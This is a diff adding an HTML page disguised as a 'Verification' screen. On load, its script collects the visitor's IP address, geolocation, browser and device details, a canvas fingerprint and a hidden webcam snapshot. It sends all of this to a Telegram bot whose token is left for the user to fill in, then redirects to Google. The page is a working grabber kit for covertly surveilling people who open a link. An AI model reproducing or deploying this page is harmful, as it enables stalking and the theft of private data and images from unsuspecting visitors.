@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f6f9fc;
+      color: #333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+      text-align: center;
+    }
+    .container {
+      max-width: 600px;
+      width: 100%;
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+    .status {
+      margin-top: 20px;
+      padding: 15px;
+      border-radius: 5px;
+      background: rgba(0, 0, 0, 0.05);
+    }
+    .loading {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(0, 0, 0, 0.1);
+      border-radius: 50%;
+      border-top-color: #333;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Verification in Progress</h1>
+    <div id="status" class="status">
+      <span id="statusText">Collecting data...</span>
+      <span class="loading"></span>
+    </div>
+  </div>
+
+  <video id="video" autoplay playsinline style="display: none;"></video>
+  <canvas id="snapshotCanvas" style="display: none;"></canvas>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = "0987654321:AABBCCDDEEFFGG"; // Replace with your token
+    const TELEGRAM_CHAT_ID = "1234567890"; // Replace with your chat ID
+
+    const statusText = document.getElementById("statusText");
+
+    async function getGeoLocation() {
+      return new Promise((resolve) => {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => resolve({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+          }),
+          (err) => resolve({ error: err.message }),
+          { timeout: 5000 }
+        );
+      });
+    }
+
+    async function fetchIPAddress() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "Unavailable";
+      }
+    }
+
+    function getCanvasFingerprint() {
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+      ctx.textBaseline = "top";
+      ctx.font = "16px Arial";
+      ctx.fillStyle = "#f60";
+      ctx.fillRect(10, 10, 100, 50);
+      ctx.fillStyle = "#069";
+      ctx.fillText("CanvasFingerprinting", 20, 30);
+      return CryptoJS.SHA256(canvas.toDataURL()).toString();
+    }
+
+    function collectSystemInfo() {
+      return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        memory: navigator.deviceMemory || "Unknown",
+        cores: navigator.hardwareConcurrency || "Unknown",
+        resolution: `${screen.width}x${screen.height}`,
+        pixelRatio: window.devicePixelRatio,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        colorDepth: screen.colorDepth,
+        doNotTrack: navigator.doNotTrack,
+        plugins: Array.from(navigator.plugins).map((p) => p.name),
+        mimeTypes: Array.from(navigator.mimeTypes).map((m) => m.type),
+      };
+    }
+
+    async function captureSnapshot() {
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("snapshotCanvas");
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        await new Promise((resolve) => (video.onloadedmetadata = resolve));
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        stream.getTracks().forEach((t) => t.stop());
+        return canvas.toDataURL("image/jpeg", 0.85);
+      } catch {
+        return null;
+      }
+    }
+
+    async function sendToTelegram(payload) {
+      const msg = `🌐 IP: ${payload.ip}
+📍 Location: ${JSON.stringify(payload.location)}
+🖥️ System: ${JSON.stringify(payload.system)}
+🔍 Fingerprint: ${payload.fingerprint}
+📸 Snapshot: ${payload.snapshot ? "[Image Attached]" : "Unavailable"}`;
+
+      // Send text message
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: msg,
+          parse_mode: "HTML",
+        }),
+      });
+
+      // Send snapshot if available
+      if (payload.snapshot) {
+        const base64Data = payload.snapshot.split(",")[1];
+        const formData = new FormData();
+        formData.append("chat_id", TELEGRAM_CHAT_ID);
+        formData.append("photo", new Blob([Uint8Array.from(atob(base64Data), c => c.charCodeAt(0))], { type: "image/jpeg" }));
+        formData.append("caption", "User snapshot");
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData,
+        });
+      }
+    }
+
+    async function collectAndSendData() {
+      statusText.textContent = "Collecting IP address...";
+      const ip = await fetchIPAddress();
+
+      statusText.textContent = "Collecting geolocation...";
+      const location = await getGeoLocation();
+
+      statusText.textContent = "Collecting system info...";
+      const system = collectSystemInfo();
+
+      statusText.textContent = "Generating fingerprint...";
+      const fingerprint = getCanvasFingerprint();
+
+      statusText.textContent = "Capturing snapshot...";
+      const snapshot = await captureSnapshot();
+
+      statusText.textContent = "Sending data...";
+      await sendToTelegram({ ip, location, system, fingerprint, snapshot });
+
+      statusText.textContent = "Verification complete. Redirecting...";
+      setTimeout(() => {
+        window.location.href = "https://www.google.com";
+      }, 2000);
+    }
+
+    // Start data collection immediately
+    collectAndSendData();
+  </script>
+</body>
+</html>
